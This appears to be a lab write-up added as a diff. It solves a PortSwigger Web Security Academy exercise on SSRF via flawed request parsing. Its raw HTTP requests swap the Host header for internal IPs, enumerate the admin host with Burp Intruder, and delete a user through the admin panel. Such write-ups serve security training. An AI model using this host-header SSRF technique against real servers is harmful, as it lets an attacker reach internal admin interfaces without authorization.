@@ -1,0 +1,30 @@
+The steps below are meant to solve the following lab:
+https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing
+
+IP Range: 192.168.0.0/24
+
+This lab accepts requests with full paths like so:
+
+GET https://[SUB_DOMAIN].web-security-academy.net/admin HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+
+Intercept request to "https://[SUB_DOMAIN].web-security-academy.net/admin".
+Change the GET path to "https://[SUB_DOMAIN].web-security-academy.net/admin" and the Host header value to "Host: 192.168.0.0", like so:
+
+GET https://[SUB_DOMAIN].web-security-academy.net/admin HTTP/1.1
+Host: 192.168.0.0
+
+Send this to  intruder and enumerate through the last octet of the IP address until you get a 200 status code.
+
+Once the valid IP address is found send a request similar to the following:
+
+GET https://[SUB_DOMAIN].web-security-academy.net/admin HTTP/1.1
+Host: 192.168.0.180
+
+Intercept the request to delete Carlos as well and modify the request similar to the following:
+
+
+POST https://[SUB_DOMAIN].web-security-academy.net/admin/delete HTTP/1.1
+Host: 192.168.0.180
+
+csrf=[TOKEN]&username=carlos
